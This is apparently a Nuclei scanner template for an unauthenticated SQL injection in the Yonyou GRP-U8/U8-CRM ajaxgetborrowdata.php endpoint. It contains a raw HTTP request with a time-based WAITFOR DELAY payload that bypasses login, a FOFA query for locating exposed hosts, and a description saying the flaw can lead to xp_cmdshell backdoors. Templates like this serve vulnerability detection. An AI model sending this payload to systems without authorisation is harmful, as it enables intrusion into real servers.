id: yonyou-grp-u8-ajaxgetborrowdata-getInvotherinfo-sqli

info:
  name: Yonyou GRP-U8 getInvOtherInfo - SQL Injection
  author: qwtd
  severity: high
  description: |
    用友U8-CRM系统ajaxgetborrowdata.php存在SQL注入漏洞，文件多个方法存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9Fajaxgetborrowdata.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: app="用友-GRP-U8"
  tags: 用友-GRP-U8

http:
  - raw:
      - |-
        @timeout: 15s
        POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getInvOtherInfo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded; charset=utf-8
        Connection: close

        cInvCode=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration>=6
          - contains(body, "cGroupCode")
        condition: and